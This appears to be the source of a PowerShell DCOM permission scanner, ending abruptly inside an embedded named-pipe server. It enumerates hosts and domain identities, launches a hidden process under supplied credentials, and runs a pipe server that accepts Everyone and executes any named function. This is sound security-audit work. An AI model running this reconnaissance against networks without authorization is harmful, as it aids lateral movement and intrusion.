<#
License: GPL v3
Author: Nimrod Levy (https://twitter.com/el3ct71k)
Disclaimer:
This tool is for testing and educational purposes only.
Any other usage for this code is not allowed. Use at your own risk.
The author or any Internet provider bears NO responsibility for misuse of this tool.
By using this you accept the fact that any damage caused by the use of this tool is your responsibility.
#>

# Add NetAPI libraries
Add-Type -MemberDefinition @"
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern uint NetApiBufferFree(IntPtr Buffer);
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int NetGetJoinInformation(
          string server,
          out IntPtr NameBuffer,
      out int BufferType);
"@ -Namespace Win32Api -Name NetApi32

$global:debug = $false # When debug is on, youll see the communication between the namedpipe server with our namedpipe client
$global:NamedPipe = "DVS" # Namedpipe name
$global:NamedpipeResponseTimeout = 5 # Namedpipe communication timeout
$global:converter = New-Object System.Management.ManagementClass Win32_SecurityDescriptorHelper # Security Descriptor converter
$global:SleepMilisecondsTime = 50 # How long time to sleep until get response

<# Access mask calculation:

    Execute Rights: 1
    Local Launch/Access: 2
    Remote Launch/Access: 4
    Local Activation: 8
    Remote Activation = 16

#>

# DACL AccessMask
$COMExecutePerm = 1
$LocalCOMLaunchOrAccessPerm = 2
$RemoteCOMLaunchOrAccessPerm = 4
$LocalCOMActivationPerm = 8
$RemoteCOMActivationPerm = 16
$FullControl = 983103
# Required Remote launch and activation rights for a DCOM object.
$global:RemoteLaunchAndActivationRights = @(
    ($COMExecutePerm + $RemoteCOMLaunchOrAccessPerm + $RemoteCOMActivationPerm),
    ($COMExecutePerm + $RemoteCOMLaunchOrAccessPerm + $RemoteCOMActivationPerm + $LocalCOMLaunchOrAccessPerm),
    ($COMExecutePerm + $RemoteCOMLaunchOrAccessPerm + $RemoteCOMActivationPerm + $LocalCOMActivationPerm),
    ($COMExecutePerm + $RemoteCOMLaunchOrAccessPerm + $RemoteCOMActivationPerm + $LocalCOMActivationPerm + $LocalCOMLaunchOrAccessPerm),
    $FullControl
);

$global:LocalLaunchAndActivationRights = @(
    ($COMExecutePerm + $LocalCOMLaunchOrAccessPerm + $LocalCOMActivationPerm),
    ($COMExecutePerm + $LocalCOMLaunchOrAccessPerm + $LocalCOMActivationPerm + $RemoteCOMLaunchOrAccessPerm),
    ($COMExecutePerm + $LocalCOMLaunchOrAccessPerm + $LocalCOMActivationPerm + $RemoteCOMActivationPerm),
    ($COMExecutePerm + $LocalCOMLaunchOrAccessPerm + $LocalCOMActivationPerm + $RemoteCOMActivationPerm + $RemoteCOMLaunchOrAccessPerm),
    $FullControl
);

# Required Access rights for a DCOM object.
$global:RemoteAccessRights = @(
    ($COMExecutePerm + $RemoteCOMLaunchOrAccessPerm),
    ($COMExecutePerm + $RemoteCOMLaunchOrAccessPerm + $LocalCOMLaunchOrAccessPerm),
    $FullControl
)

$global:LocalAccessRights = @(
    ($COMExecutePerm + $LocalCOMLaunchOrAccessPerm),
    ($COMExecutePerm + $RemoteCOMLaunchOrAccessPerm + $LocalCOMLaunchOrAccessPerm),
    $FullControl
)

# Log locations
$global:LogFileName = "$($(Get-Location).Path)\log.txt"
$global:ResultsFileName = "$($(Get-Location).Path)\results.csv"

# Regex for fetch argument list of function
[regex]$global:regexFunctionArgs = "\(.*\)"

# Regex for clsids validation
[regex]$global:guidRegex = '(?im)^[{(]?[0-9A-F]{8}[-]?(?:[0-9A-F]{4}[-]?){3}[0-9A-F]{12}[)}]?$'

# Regex to identify IP address
[regex]$global:IPRegex = '^(?:(?:(?:\d{0,3}\.){3})\d)$'

# Collects all builtin functions in order to skip them
$global:NativeFunctions = @( 
                            [System.String](""), [System.Int32](1), [System.Boolean]($true),
                            [System.Array](1,2), @{"A"="B"}, (New-Object PSObject)
                            )|ForEach {
    $_.psobject.Members|ForEach {
        %{$_.Name}
    }
}| Select -Unique

# General function list

Function Write-Log {
    [CmdletBinding(SupportsShouldProcess=$true)]
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateSet("INFO","VERBOSE","ERROR")]
        [String]$Level,
        [switch]$forceVerbose,
        [Parameter(Mandatory=$True)]
        $Message
    )

    $Line = "$((Get-Date).toString("yyyy/MM/dd HH:mm:ss")) $($Level) $($Message)";
    if($Level -eq "VERBOSE" -or $forceVerbose) { # output only if write-log on verbose mode.
        if($VerbosePreference -eq "Continue") {
            if($Level -eq "ERROR") {
                Write-Warning $Line
            } else {
                Write-Verbose $Line
            }
            
            $global:LogStream.WriteLine($Line)|Out-Null
            $global:LogStream.Flush()|Out-Null
        }
        return
    }
    if($Level -eq "ERROR") {
        Write-Warning $Line;
    } else {
        Write-Host $Line;
    }
    
    $global:LogStream.WriteLine($Line)|Out-Null

}

function ConvertTo-CliXml {
    param(
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [PSObject[]]$InputObject
    )

    # This function is responsible to serialize objects in order to communicate with the namedpipe

    begin {
        $type = [PSObject].Assembly.GetType('System.Management.Automation.Serializer')
        $ctor = $type.GetConstructor('instance,nonpublic', $null, @([System.Xml.XmlWriter]), $null)
        $sw = New-Object System.IO.StringWriter
        $xw = New-Object System.Xml.XmlTextWriter $sw
        $serializer = $ctor.Invoke($xw)
    }
    process {
        try {
            [void]$type.InvokeMember("Serialize", "InvokeMethod,NonPublic,Instance", $null, $serializer, [object[]]@($InputObject))
        } catch {
            if($global:debug) {
                Write-Log -Level ERROR -Message "Could not serialize $($InputObject.GetType()): $_" -forceVerbose
            }
        }
    }
    end {
        [void]$type.InvokeMember("Done", "InvokeMethod,NonPublic,Instance", $null, $serializer, @())
        $sw.ToString()
        $xw.Close()
        $sw.Dispose()
    }
}

function ConvertFrom-CliXml {
    param(
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String[]]$InputObject
    )

    # This function is responsible to deserialize objects in order to communicate with the namedpipe

    begin
    {
        $OFS = "`n"
        [String]$xmlString = ""
    }
    process
    {
        $xmlString += $InputObject
    }
    end
    {
        $type = [PSObject].Assembly.GetType('System.Management.Automation.Deserializer')
        $ctor = $type.GetConstructor('instance,nonpublic', $null, @([xml.xmlreader]), $null)
        $sr = New-Object System.IO.StringReader $xmlString
        $xr = New-Object System.Xml.XmlTextReader $sr
        $deserializer = $ctor.Invoke($xr)
        $done = $type.GetMethod('Done', [System.Reflection.BindingFlags]'nonpublic,instance')
        while (!$type.InvokeMember("Done", "InvokeMethod,NonPublic,Instance", $null, $deserializer, @()))
        {
            try {
                $type.InvokeMember("Deserialize", "InvokeMethod,NonPublic,Instance", $null, $deserializer, @())
            } catch {
                if($global:debug) {
                    Write-Log -Level ERROR -Message "Could not deserialize ${string}: $_" -forceVerbose
                }
            }
        }
        $xr.Close()
        $sr.Dispose()
    }
}

Function Start-NamedPipeClient {
    param(
        [string]$pipeName
    )
    
    # This function is responsible to creates namedpipe client in order to communicate with the namedpipe server.

    # START SCRIPTBLOCK
    [ScriptBlock]$ListenerScript = {
        param(
            [Parameter(Mandatory=$true)]
            [string]$pipeName,
            [Parameter(Mandatory=$true)]
            [System.Collections.Queue]$producer,
            [Parameter(Mandatory=$true)]
            [System.Collections.Queue]$consumer,
            [System.Int32]$SleepMilisecondsTime
        )

        function Start-NamedPipeClient {
            param(
                [Parameter(Mandatory=$true)]
                [string]$pipeName,
                [System.Int32]$SleepMilisecondsTime
            )
            # This function is responsible to find if the namedpipe server is up, and interact with it.
            while(!(Find-InArray -Content $pipeName -Array [System.IO.Directory]::GetFiles("\\.\\pipe\\"))) {
                Sleep -Milliseconds $SleepMilisecondsTime
            }
            $npipeClient = new-object System.IO.Pipes.NamedPipeClientStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::InOut,
                                                                        [System.IO.Pipes.PipeOptions]::None, 
                                                                        [System.Security.Principal.TokenImpersonationLevel]::Impersonation)
            $npipeClient.Connect()
            $pipeReader = new-object System.IO.StreamReader($npipeClient)
            $pipeWriter = new-object System.IO.StreamWriter($npipeClient)
            return $npipeClient, $pipeReader, $pipeWriter
            
            
        }
        
        $npipeClient, $pipeReader, $pipeWriter = Start-NamedPipeClient -pipeName $pipeName -SleepMilisecondsTime $SleepMilisecondsTime
        if(!$npipeClient) {
            $consumer.Enqueue(@($false, "Namedpipe not exists!"))|Out-Null
            return;
        }
        $consumer.Enqueue(@($true, ""))|Out-Null
        while($npipeClient.IsConnected) { # Wait until the namedpipe is disconnected
            if( $producer.Count -eq 0) {
                Sleep -Milliseconds $SleepMilisecondsTime
                continue
            }

            $req = $producer.Dequeue() # collect requests from producer queue and send them to the namedpipe.
            $pipeWriter.WriteLine($req)
            $pipeWriter.Flush()
            $results = $pipeReader.ReadLine() # collect the results from the namedpipe and store it on the consumer queue
            if($results) {
                $consumer.Enqueue($results)|Out-Null
            }
            if($req['FunctionName'] -eq "exit") {
                return
            }
        }
        
        $npipeClient.Dispose() # Close namedpipe connection
    }
    
    
    # END SCRIPTBLOCK
    
    
    $ps = [PowerShell]::Create() # Creates the namedpipe client under a runspace
    $ps.AddScript($ListenerScript)|Out-Null
    @($pipeName, $global:Producer, $global:Consumer,$global:SleepMilisecondsTime)|ForEach {
        $ps.AddArgument($_)|Out-Null
    }
    return $ps, $ps.BeginInvoke()
    
    
}

function Start-NamedpipeListener {
    param()
    # This function is responsible to creates a namedpipe client and wait until the server allows our connection
    $global:ps, $global:handle = Start-NamedPipeClient -pipeName $global:NamedPipe
    while($global:Consumer.Count -eq 0) {
        sleep -Milliseconds $global:SleepMilisecondsTime
    }
    $status, $response = $global:Consumer.Dequeue()
    if(!$status) {
        Write-Log -Level ERROR -Message $($response) -forceVerbose
    }
    return $status
}

function Close-NamedPipeClient {
    param(
        [Parameter(Mandatory = $true)]
        $ps,
        [Parameter(Mandatory = $true)]
        $handle
    )
    # This function is responsible to request the namedpipe server to close, and then, it closes the namedpipe client
    $global:Producer.Enqueue((ConvertTo-CliXml -InputObject @{FunctionName="exit"}))|Out-Null
    while(!$handle.IsCompleted) {
        Sleep -Milliseconds $global:SleepMilisecondsTime
    }
    $ps.Runspace.CloseAsync()
}

function Invoke-NamedpipeMission {
    param(
        [Parameter(Mandatory=$true)]
        [system.object]$MissionInfo
    )
    # This function is responsible to serialize and send missions to the namedpipe server, and then, collects the results
    $global:Producer.Enqueue((ConvertTo-CliXml -InputObject $MissionInfo))|Out-Null
    while($global:Consumer.Count -eq 0) {
        sleep -Milliseconds $global:SleepMilisecondsTime
    }

    while($global:Consumer.Count -ne 0) {
        $res = $global:Consumer.Dequeue()
        $res = ConvertFrom-CliXml -InputObject $res
        if(!$res.IsSuccess -and $res.Result) {
            Write-Log -Level ERROR -Message "$($res.Result) (From NamedPipe)" -forceVerbose
        }
        return $res
    }
}


function Skip-LastItem {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Array])]
    param(
        [System.Array]$Array
    )

    # This function is responsible to skip the last item in array (compatible with Powershell v2)
    if($Array.Count -eq 1) {
        return @();
    }
    return $Array[0..($Array.Count-2)]
}

function Get-GetHostByName {
    [OutputType([string])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Hostname
    )
    # This function is responsible to resolve ip address of hostname
    if($Hostname -eq $env:COMPUTERNAME) {
        return "127.0.0.1"
    }
    return [System.Net.Dns]::GetHostByName($Hostname).AddressList[0].IPAddressToString
}


function Get-GetHostByAddress {
    [OutputType([string])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$RemoteIP
    )
    # This function is responsible to response hostname of ipaddress
    try {
        return [System.Net.Dns]::GetHostByAddress($RemoteIP).Hostname
    } catch {
       Write-Log -Level ERROR -Message $_ -forceVerbose
       return ""
    }
}


function Find-InArray {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Boolean])]
    param(
        $Content,
        [system.array]$Array
    )
    # This function is responsible to find string in array (compatible with Powershell v2)
    foreach($data in $Array) {
        if($data -eq $Content) {
            return $true
        }
        
    }
    return $false
}

function Get-MachineIPAddresses {
    [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()|foreach {
    $_.GetIPProperties()|Foreach {
        %{ (($_.UnicastAddresses).Address).IPAddressToString }
    }
}
}

Function Enum-HostList {
    param(
        [string]$HostList
    )
    # This function is responsible to collect hostlist (seperated by comma), detect if the host is ipaddress/CIDR range or hostname, and resolve them.
    $IPAddressList = Get-MachineIPAddresses
    foreach($HostItem in $HostList.Split(",")) {
        $HostItem = $HostItem.Trim()
        if(!($HostItem -match $global:IPRegex -or $HostItem.Contains("/"))) {
            $IPAddress = Get-GetHostByName($HostItem)
            if(Find-InArray -Content $IPAddress -Array $IPAddressList) {
                % { "127.0.0.1"}
                continue
            }
            %{$IPAddress}
            continue
        }
        if(!($HostItem.Contains("/"))) {
            %{$HostItem}
            continue
        }
        $NetworkAddress = ($HostItem.split("/"))[0]
        [int]$NetworkLength = ($HostItem.split("/"))[1]
        $IPLength = 32-$NetworkLength
        $NetworkIP = ([System.Net.IPAddress]$NetworkAddress).GetAddressBytes()
        [Array]::Reverse($NetworkIP)
        $LongIP = ([System.Net.IPAddress]($NetworkIP)).Address
        For ($IPGap=0; $IPGap -lt (([System.Math]::Pow(2, $IPLength))); $IPGap++) {
            $IPAddress = ([System.Net.IPAddress]($LongIP+$IPGap)).GetAddressBytes()
            [Array]::Reverse($IPAddress)
            $IPAddress = ([System.Net.IPAddress]($IPAddress)).IPAddressToString
            if(Find-InArray -Content $IPAddress -Array $IPAddressList) {
                %{"127.0.0.1"}
                continue
            }
            %{$IPAddress}
        }
    }
}

function Get-DomainNameFromRemoteRegistryHKLM {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([string])]
    param()

    # Resolve domain name from using registry
    if($global:ChoosenHive -eq "HKLM") {
        try {
            return (Read-RegString -Key "System\CurrentControlSet\Services\Tcpip\Parameters" -Value "Domain").ToLower().Split(".")[0]
        } catch {
            Write-Log -Level ERROR -Message $_ -forceVerbose
            return ""
        }
    }
    return ""
    
}

function Get-DomainNameFromRemoteRegistryHKCU {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([string])]
    param()
    # Resolve domain name from using registry
    if($global:ChoosenHive -eq "HKCU") {
        try {
            return (Read-RegString -Key "Volatile Environment" -Value "USERDOMAIN").ToLower()
        } catch {
            Write-Log -Level ERROR -Message $_ -forceVerbose
            return ""
        }
    }
    return ""
    
}

function Get-DomainNameFromRemoteNetBIOS {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([string])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP
    )
    # This function is responsible to resolve domain name via remote NetBIOS over TCP (like nbtstat)

    try {
        $pNameBuffer = [IntPtr]::Zero
        $joinStatus = 0
        $apiResult = [Win32Api.NetApi32]::NetGetJoinInformation(
            $RemoteIP,          # lpServer
            [Ref] $pNameBuffer, # lpNameBuffer
            [Ref] $joinStatus   # BufferType
        )
        if ( $apiResult -eq 0 ) {
            $domain = [Runtime.InteropServices.Marshal]::PtrToStringAuto($pNameBuffer)
            [Void] [Win32Api.NetApi32]::NetApiBufferFree($pNameBuffer)
            return $domain.ToLower()
        }
        return ""
    } catch {
        Write-Log -Level ERROR -Message $_ -forceVerbose
        return ""
    }
}

function Get-DomainNameFromRemoteMachine {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([string])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP
    )

    <#
        This function is responsible to resolve the domain name from the remote machine using Get-DomainNameFromRemoteNetBIOS function.
        If it fails, it will try to resolve it using DomainNameFromRemoteRegistryHKLM function
        if it fails, it will try to resole it using DomainNameFromRemoteRegistryHKCU.
    #>
    if(!$global:RemoteDomain) {
        $DomainName = Get-DomainNameFromRemoteNetBIOS -RemoteIP $RemoteIP
        if($DomainName) {
            Write-Log -Level VERBOSE -Message "Remote Domain: $($DomainName) | Technique: NetBIOS"
            $global:RemoteDomain = $DomainName
            return $DomainName
        }

        $DomainName = Get-DomainNameFromRemoteRegistryHKLM
        if($DomainName) {
            Write-Log -Level VERBOSE -Message "Remote Domain: $($DomainName) | Technique: Registry (HKLM)"
            $global:RemoteDomain = $DomainName
            return $DomainName
        }

        $DomainName = Get-DomainNameFromRemoteRegistryHKCU
        if($DomainName) {
            Write-Log -Level VERBOSE -Message "Remote Domain: $($DomainName) | Technique: Registry (HKCU)"
            $global:RemoteDomain = $DomainName
            return $DomainName
        }
    }

    return $global:RemoteDomain
}

function is-DomainJoinedUserSession {
    param(
        [string]$RemoteIP
    )
    # This function is responsible to check if the attacker machine is domain-joined user (or attack the loopback :D)
    return ((is-LoopBack -RemoteIP $RemoteIP) -or $env:userdomain.ToLower() -eq (Get-DomainNameFromRemoteMachine -RemoteIP $RemoteIP))
}

function Get-userSID {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [Parameter(Mandatory = $true)]
        [string]$Username # Gets username without domain-name
    )

    # This function is responsible to resolve the user SID using WindowsIdentity feature, if it fails, it will try to produce it using ADSI protocool

    
    
    if(Find-InArray -Content $Username -Array $global:UserSIDList.Keys) {
        return $global:UserSIDList[$Username]
    }

    # If the user that needs to be analyzed is in the same domain environment, try to resolve the groups using ASDI protocol

    $SID = Get-UserSIDUsingADSI -RemoteIP $RemoteIP -Username $Username
    if($SID) {
        Write-Log -Level VERBOSE -Message "$($Username) resolved user SID using ADSI"
        $global:UserSIDList[$Username] = $SID
        return $SID
    }
    
    if(is-DomainJoinedUserSession -RemoteIP $RemoteIP) {
        try {
            if($Username -eq $env:username) {
                $SID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
            }else {
                $SID = ([System.Security.Principal.WindowsIdentity]($Username)).User.Value
            }
            Write-Log -Level VERBOSE -Message "$($Username) Resolved identity SID using WindowsIdentity"
            $global:UserSIDList[$Username] = $SID
            return $SID
        } catch {
            Write-Log -Level ERROR -Message $_ -forceVerbose
        }
    }
    # If fails, or the user is not domained-joined, try to resolve groups using the windows-identity feature.
    
    Write-Log -Level ERROR -Message "Can't resolve user SID"
    return $false
    
}

function Get-GroupSID {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [Parameter(Mandatory = $true)]
        [string]$GroupName
    )
    # This function is responsible to resolve the group SID using NTAccount feature, if it fails, it will try to produce it using ADSI protocool
    if(Find-InArray -Content $GroupName -Array $global:GroupSIDList.Keys) {
        return $global:GroupSIDList[$GroupName]
    }

    # If fails, or the user is not domained-joined, try to resolve groups using ASDI protocol.
    $SID = Get-GroupSIDUsingADSI -RemoteIP $RemoteIP -GroupName $GroupName
    if($SID) {
        Write-Log -Level VERBOSE -Message "${GroupName} Group Resolved SID using ADSI"
        $global:GroupSIDList[$GroupName] = $SID
        return $SID
    }

    try {
        $SID = ([System.Security.Principal.NTAccount]($GroupName)).Translate([security.principal.securityidentifier]).Value
        Write-Log -Level VERBOSE -Message "${GroupName} Group Resolved SID using NTAccount"
        $global:GroupSIDList[$GroupName] = $SID
        return $SID
    } catch {
    Write-Log -Level ERROR -Message $_
    }
    Write-Log -Level ERROR -Message "Can't resolve group SID"
    return $false
    
}

function Get-UserGroupsUsingWindowsIdentity {
    param(
        [Parameter(Mandatory = $true)]
        [System.Security.Principal.WindowsIdentity]$Token
    )
    # This function is responsible to resolve SID groups of user (include his user SID)
    % {@{GroupName=$Token.Name.Split("\")[-1]; SID=$Token.User.Value}}
    Foreach($sid in $Token.Groups) { 
        try {
            $groupName = ([System.Security.Principal.SecurityIdentifier]$sid).Translate([System.Security.Principal.NTAccount]).ToString()
            # Remove all uppercase groups(INTERACTIVE, SELF, etc.)
            if($groupName.Contains("NT AUTHORITY\") -or ($groupName -ceq $groupName.ToUpper())) {
                continue
            }
            $global:GroupSIDList[$GroupName] = $sid.Value
            %{ $sid.Value }
        
        } catch {
            continue
        }
    }
}

function Get-UserToken {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Username
    )
    try {
        return [System.Security.Principal.WindowsIdentity]($Username)
    } catch {
        Write-Log -Level ERROR -Message $_ -forceVerbose
        return $false
    }
    
}

function Check-Username {
    [OutputType([string])]
    param(
        [string]$Username
    )
    return (Iif -Condition $Username -Right $Username.Replace("/", "\") -Wrong "$($env:USERDOMAIN)\$($env:USERNAME)")
}

function Get-UserGroup {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [Parameter(Mandatory = $true)]
        [string]$Username # Gets username without domain-name

    )

    %{ (Get-GroupSID -RemoteIP $RemoteIP -GroupName "Everyone") }

    # Try to resolve groups using ASDI protocol.
    $res = Get-UserGroupsUsingADSI -RemoteIP $RemoteIP -Username $Username
    if($res) {
        Write-Log -Level VERBOSE -Message "Resolved user groups using ADSI (Identity: $($Username))"
        return $res
    }

    # Try to resolve groups using WindowsIdentity.
    if(is-DomainJoinedUserSession -RemoteIP $RemoteIP) {
        $Token = Get-UserToken -Username $Username
        if($Token) {
            Get-UserGroupsUsingWindowsIdentity -Token $Token
            Write-Log -Level VERBOSE -Message "Resolved user groups using WindowsIdentity (Identity: $($Username))"
            return
        }
        

        if($Username -eq $env:USERNAME) {
            # Try to resolve groups using WindowsIdentity using current session.
            Get-UserGroupsUsingWindowsIdentity -Token ([System.Security.Principal.WindowsIdentity]::GetCurrent())
            Write-Log -Level VERBOSE -Message "Resolved user groups using WindowsIdentity (Identity: $($Username) (Current session groups))"
            return
        }
        Write-Log -Level VERBOSE -Message "Can't resolve user groups, trying to guess groups."
    }

    # If fails, try to guess the groups.
    @((Get-userSID -RemoteIP $RemoteIP -Username $Username), (Get-GroupSID -RemoteIP $RemoteIP -GroupName "Users"))|Foreach {
        % { $_ }
    }
    if(is-DomainJoinedUserSession -RemoteIP $RemoteIP) {
        %{ (Get-GroupSID -RemoteIP $RemoteIP -GroupName "Domain users") }
    }
    
    
}


function IIf {
    param
    (
        $Condition,
        [Parameter(Mandatory = $true)]
        $Right,
        [Parameter(Mandatory = $true)]
        $Wrong
    )
    # If/else oneliner, it uses when we want to simplify basic operations.
    if ($Condition) {
        return $Right
    }
    return $Wrong
}

function Start-ImpersonationSession {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True)]
        [String]$Domain,
        [Parameter(Mandatory = $True)]
        [String]$Username,
        [String]$Password,
        [Parameter(Mandatory = $True)]
        [string]$Filename,
        [string]$Arguments,
        [switch]$NetOnly
    )

    # This function is responsible to create a process using provided credentials/current session for the namedpipe process.
    if(!$Password) {
        $WindowStyle = Iif -Condition $global:debug -Right "Normal" -Wrong "Hidden"
        Start-Process -FilePath $Filename -ArgumentList @($Arguments) -WindowStyle $WindowStyle
        return $true
    }
    Add-Type -TypeDefinition @'
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    public static class Advapi32
    {
        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
            String userName,
            String domain,
            String password,
            int logonFlags,
            String applicationName,
            String commandLine,
            int creationFlags,
            int environment,
            String currentDirectory,
            ref  STARTUPINFO startupInfo,
            out PROCESS_INFORMATION processInformation);
    }
    
    public static class Kernel32
    {
        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();
    } 
'@

    # StartupInfo Struct
    $StartupInfo = New-Object STARTUPINFO
    $StartupInfo.dwFlags = 0x00000001
    $StartupInfo.wShowWindow = Iif -Condition $global:debug -Right 0x0001 -Wrong 0x0000 # 0x0000 - Hide window, 0x0001 - Show window
    $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)
    
    # ProcessInfo Struct
    $ProcessInfo = New-Object PROCESS_INFORMATION
    
    # CreateProcessWithLogonW --> lpCurrentDirectory
    $GetCurrentPath = (Get-Item -Path ".\").FullName
    $CallResult = [Advapi32]::CreateProcessWithLogonW(
        $Username.Split("\")[-1], $Domain, $Password, (Iif -Condition $NetOnly -Right 0x2 -Wrong 0x1), 
        $Filename, $Arguments, 0x04000000, $null, $GetCurrentPath,
        [ref]$StartupInfo, [ref]$ProcessInfo)
    
    if (!$CallResult) {
        Write-Log -Level ERROR -Message $((New-Object System.ComponentModel.Win32Exception([int][Kernel32]::GetLastError())).Message).ToString()
        return $false
    }
    return $true


}
function Start-NamedPipe-Server {
    [CmdletBinding(SupportsShouldProcess=$true)]
    [OutputType([System.Array])]
    param(
        [string]$Username,
        [string]$Password
    )

    # This function is responsible to create a new process using Start-ImpersonationSession function, and inject the server payload

    $ServerContent = @'
$global:reg = ""
$global:RemoteIP = ""
$global:ChoosenHive = ""
$global:StdRegProvHive = ""
$global:RegAuthenticationMethod = ""

$global:COMObject = $null
$global:COMSnapshots = @{}
$global:COMTimeout = [COMTIMEOUT] # Max COMObject intraction timeout
$global:debug = [DEBUG]
$global:SleepMilisecondsTime = [SLEEPTIME]
$global:RunSpaceClosedList = New-Object System.Collections.ArrayList


# NamedPipe functions
function Start-NamedPipeServer {
    [OutputType([System.Array])]
    param(
        [Parameter(Mandatory=$true)]
        [string]$pipeName
    )
    # This function is responsible to start a NamedPipe server
    $PipeSecurity = new-object System.IO.Pipes.PipeSecurity
    $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "FullControl", "Allow" )
    $PipeSecurity.AddAccessRule($AccessRule)
    $pipeDir  = [System.IO.Pipes.PipeDirection]::InOut
    $pipeMsg  = [System.IO.Pipes.PipeTransmissionMode]::Message
    $pipeOpti = [System.IO.Pipes.PipeOptions]::Asynchronous
    $npipeServer = New-Object system.IO.Pipes.NamedPipeServerStream($pipeName, $pipeDir, 100, $pipeMsg, $pipeOpti, 32760, 32760, $PipeSecurity )
    $npipeServer.WaitForConnection();
    $pipeReader = new-object System.IO.StreamReader($npipeServer)
    $pipeWriter = new-object System.IO.StreamWriter($npipeServer)
    return $npipeServer, $pipeReader, $pipeWriter
    
}

function Remove-ClosedRunSpaces {
    param()
    # This function is responsible to remove all closed runspaces - compatible with powershell v2
    $idx = 0
    $rsList = {$($global:RunSpaceClosedList|?{$_})}.Invoke()
    foreach($ps in $rsList) {
        if($ps.RunspaceStateInfo.State -ne "Closed") {
            $idx += 1
            continue
        }
        $ps.Dispose()
        $global:RunSpaceClosedList.RemoveAt($idx)|Out-Null
        
    }
}


function Start-NamedPipeManager {
    param(
        [string]$pipeName
    )
    # This function is responsible to launch and manage the pipe communication.
    while($true) {
        $npipeServer, $pipeReader, $pipeWriter = Start-NamedPipeServer -pipeName $pipeName
        while($true) {
            try {
                $res = $pipeReader.ReadLine()

                if(!$res) {
                    $npipeServer.Dispose()
                    break
                }

                if($global:debug) {
                    Write-Host $res
                }

                $res = ConvertFrom-CliXml -InputObject $res
                $FunctionName = $res['FunctionName']
                if($FunctionName -eq "exit") {
                    $npipeServer.Dispose()
                    return
                }
                if($res.Arguments) {
                    $Arguments = $res.Arguments
                    [bool]$isSuccess, $response = (& $FunctionName @Arguments)
                } else {
                    [bool]$isSuccess, $response = (& $FunctionName)
                }
                
            } catch {
                [bool]$isSuccess, [string]$response = @($false, $_)
            }
            $pipeWriter.WriteLine((ConvertTo-CliXml -InputObject @{IsSuccess=$isSuccess; Result=$response}))
            $pipeWriter.Flush()
            Remove-ClosedRunSpaces
            [System.GC]::Collect() # perform garbage collection in order to release memory
            Sleep -Milliseconds $global:SleepMilisecondsTime
            
        }

    }

}

# General function list

function ConvertTo-CliXml {
    param(
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [PSObject[]]$InputObject
    )

    # This function is responsible to serialize objects in order to communicate with the namedpipe

    begin {
        $type = [PSObject].Assembly.GetType('System.Management.Automation.Serializer')
        $ctor = $type.GetConstructor('instance,nonpublic', $null, @([System.Xml.XmlWriter]), $null)
        $sw = New-Object System.IO.StringWriter
        $xw = New-Object System.Xml.XmlTextWriter $sw
        $serializer = $ctor.Invoke($xw)
    }
    process {
        try {
            [void]$type.InvokeMember("Serialize", "InvokeMethod,NonPublic,Instance", $null, $serializer, [object[]]@($InputObject))
        } catch {
            if($global:debug) {
                Write-Warning "Could not serialize $($InputObject.GetType()): $_"
            }
        }
    }
    end {
        [void]$type.InvokeMember("Done", "InvokeMethod,NonPublic,Instance", $null, $serializer, @())
        $sw.ToString()
        $xw.Close()
        $sw.Dispose()
    }
}

function ConvertFrom-CliXml {
    param(
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String[]]$InputObject
    )

    # This function is responsible to deserialize objects in order to communicate with the namedpipe

    begin
    {
        $OFS = "`n"
        [String]$xmlString = ""
    }
    process
    {
        $xmlString += $InputObject
    }
    end
    {
        $type = [PSObject].Assembly.GetType('System.Management.Automation.Deserializer')
